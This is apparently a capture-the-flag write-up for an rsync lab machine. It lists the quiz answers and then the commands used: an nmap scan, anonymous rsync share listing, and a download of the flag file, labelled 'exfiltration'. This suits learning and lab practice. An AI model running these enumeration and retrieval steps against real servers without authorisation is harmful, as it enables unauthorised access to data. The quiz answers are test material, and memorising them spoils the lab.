## 1. Questions
- Task 1
	- What is the default port for rsync?
		- `873`
- Task 2
	- How many TCP ports are open on the remote host?
		- `1`
- Task 3
	- What is the protocol version used by rsync on the remote machine?
		- `31`
- Task 4
	- What is the most common command name on Linux to interact with rsync?
		- `rsync`
- Task 5
	- What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync
		- `None`
- Task 6
	- What is the option to only list shares and files on rsync? (No need to include the leading -- characters)
		- `list-only`
- Submit Flag
	- Submit root flag
## 2. Tools Used
- Linux
- CLI
- nmap
- rsync
- cat
## 3. Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.150.109
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```
<snip>
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
<snip>
```
### Test rsync connection (without credentials)
- Useful resources
	- https://hackviser.com/tactics/pentesting/services/rsync#enumerate-shared-folders
```bash
rsync 10.129.150.109::
```
- Result
```
public         	Anonymous Share
```
### Explore the files and directories of the module
- Useful resource
	- https://hackviser.com/tactics/pentesting/services/rsync#enumerate-shared-folders
```bash
rsync -av --list-only rsync://10.129.150.109/public
```
- Result
```bash
<snip>
drwxr-xr-x          4,096 2022/10/24 17:02:23 .
-rw-r--r--             33 2022/10/24 16:32:03 flag.txt
<snip>
```
### Exfiltrate flag.txt
- Useful resource
	- https://hackviser.com/tactics/pentesting/services/rsync#data-exfiltration
```bash
rsync -avz rsync://10.129.150.109/public/flag.txt ./flag.txt
```
### Retrieve the flag
```bash
cat ./flag.txt
```
